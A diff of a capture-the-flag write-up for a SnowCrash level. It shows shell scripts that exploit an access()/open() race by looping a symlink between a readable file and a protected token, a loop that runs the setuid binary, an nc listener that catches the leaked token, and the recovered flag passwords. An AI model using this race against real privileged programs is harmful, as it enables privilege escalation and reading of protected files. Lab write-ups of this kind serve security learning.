@@ -66,32 +66,60 @@ NOTES
 Warning:  Using  access()  to  check  if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to  manipulate  it.   For  this reason,  the use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
 ```
 
-What we want to do is that the access happens on a file where we have the rights and the open on the token. Let's first create the file. 
+What we want to do is that the access happens on a file where we have the rights and the open on the token.
+To do so we will create in a loop a file, delete it and create a symbolic link to token. 
 
 ```bash 
-$ echo 'salut' > /tmp/salut
-```
+$ cat symlink.sh
+#!/bin/bash
 
-Thn we are going to need a 'faketoken' file, which will be a link once to the token to read it and another time a link to '/tmp/salut' to pass the rights check. 
-
-Since all this happens very fast we will have to do it in a infinite loop. 
-
-```bash 
 while true; do
-    # Création d'un lien symbolique /tmp/faketoken pointant vers /tmp/coucou
-    ln -sf /tmp/coucou /tmp/faketoken
-
-    # Création d'un lien symbolique /tmp/faketoken pointant vers $(pwd)/token
-    ln -sf $(pwd)/token /tmp/faketoken
-done &
+        touch /tmp/link
+        rm -f /tmp/link
+        ln -s /home/user/level10/token /tmp/link
+        rm -f /tmp/link
+done
 ```
 
 
+Now in another program we will execute level10 excutable in a loop wih our file /tmp/link as an argument hoping that when the open is called it happens on the token. 
 
 
+```bash 
+$ cd /tmp
+$ touch spam.sh
+$ cat spam.sh
+#!/bin/bash
+
+while true; do
+    /home/user/level10/level10 /tmp/link 192.168.1.75
+done
+```
+
+We launch both our scripts in windows and we listen to the port 6969 (like we saw with strings that is where the output of level10 will be). 
+
+```bash 
+$ nc -lk 6969
+[...]
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+^C
+```
 
 
-
-
+Let's try 
+```bash
+level10@SnowCrash:~$ su flag10
+Password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+````
 
 
